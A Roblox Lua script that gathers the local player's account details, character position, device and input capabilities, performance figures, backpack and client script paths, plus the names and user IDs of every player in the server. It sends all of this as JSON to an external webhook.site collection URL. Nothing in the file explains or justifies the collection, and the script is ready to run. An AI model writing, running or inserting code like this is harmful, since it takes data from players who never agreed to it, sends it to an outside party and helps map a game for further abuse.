local Http = game:GetService("HttpService")
local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local Stats = game:GetService("Stats")
local Lighting = game:GetService("Lighting")
local LocalPlayer = Players.LocalPlayer
local info = {}

-- Player info
pcall(function()
    info.username = LocalPlayer.Name
    info.displayName = LocalPlayer.DisplayName
    info.userId = LocalPlayer.UserId
    info.accountAge = LocalPlayer.AccountAge
    info.membership = tostring(LocalPlayer.MembershipType)
    info.team = tostring(LocalPlayer.Team)
    info.followUserId = LocalPlayer.FollowUserId
end)

-- Character stats
pcall(function()
    local char = LocalPlayer.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            info.health = hum.Health
            info.maxHealth = hum.MaxHealth
            info.walkSpeed = hum.WalkSpeed
            info.jumpPower = hum.JumpPower
            info.displayName = hum.DisplayName
        end
        local root = char:FindFirstChild("HumanoidRootPart")
        if root then
            info.position = tostring(root.Position)
            info.velocity = tostring(root.Velocity)
        end
    end
end)

-- LocalPlayer attributes
pcall(function()
    local attrs = {}
    for k, v in pairs(LocalPlayer:GetAttributes()) do
        attrs[k] = tostring(v)
    end
    info.playerAttributes = attrs
end)

-- Game info
pcall(function()
    info.placeId = game.PlaceId
    info.jobId = game.JobId
    info.placeVersion = game.PlaceVersion
    info.gameId = game.GameId
    info.serverTime = os.time()
    info.serverDate = os.date()
    info.creatorId = game.CreatorId
    info.creatorType = tostring(game.CreatorType)
end)

-- Device info
pcall(function()
    info.platform = tostring(UIS:GetPlatform())
    info.touchEnabled = UIS.TouchEnabled
    info.keyboardEnabled = UIS.KeyboardEnabled
    info.mouseEnabled = UIS.MouseEnabled
    info.gamepadEnabled = UIS.GamepadEnabled
    info.accelerometerEnabled = UIS.AccelerometerEnabled
    info.gyroscopeEnabled = UIS.GyroscopeEnabled
end)

-- Performance/hardware
pcall(function()
    info.fps = math.floor(1/Stats.HeartbeatTime)
    info.memoryUsageMB = Stats:GetTotalMemoryUsageMb()
    info.heartbeatTime = Stats.HeartbeatTime
    info.ping = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
end)

-- Camera/screen
pcall(function()
    local cam = workspace.CurrentCamera
    info.viewportSize = tostring(cam.ViewportSize)
    info.cameraType = tostring(cam.CameraType)
    info.fieldOfView = cam.FieldOfView
end)

-- All players
pcall(function()
    local playerList = {}
    for _, p in ipairs(Players:GetPlayers()) do
        table.insert(playerList, p.Name .. " (id:" .. p.UserId .. ")")
    end
    info.allPlayers = playerList
    info.playerCount = #playerList
end)

-- Backpack/tools
pcall(function()
    local tools = {}
    for _, t in ipairs(LocalPlayer.Backpack:GetChildren()) do
        table.insert(tools, t.Name)
    end
    if LocalPlayer.Character then
        for _, t in ipairs(LocalPlayer.Character:GetChildren()) do
            if t:IsA("Tool") then
                table.insert(tools, t.Name .. " (equipped)")
            end
        end
    end
    info.backpack = tools
end)

-- Client scripts
pcall(function()
    local scripts = {}
    for _, v in ipairs(LocalPlayer.PlayerGui:GetDescendants()) do
        if v:IsA("LocalScript") or v:IsA("ModuleScript") then
            table.insert(scripts, v:GetFullName())
        end
    end
    info.clientScripts = scripts
end)

-- Lighting
pcall(function()
    local lightingAttrs = {}
    for k, v in pairs(Lighting:GetAttributes()) do
        lightingAttrs[k] = tostring(v)
    end
    info.lightingAttributes = lightingAttrs
    info.lightingChildren = {}
    for _, v in ipairs(Lighting:GetChildren()) do
        table.insert(info.lightingChildren, v.Name .. " [" .. v.ClassName .. "]")
    end
end)

-- Send
Http:RequestAsync({
    Url = "https://webhook.site/0898d375-6291-449a-a586-94c13515b8d5",
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = Http:JSONEncode(info)
})
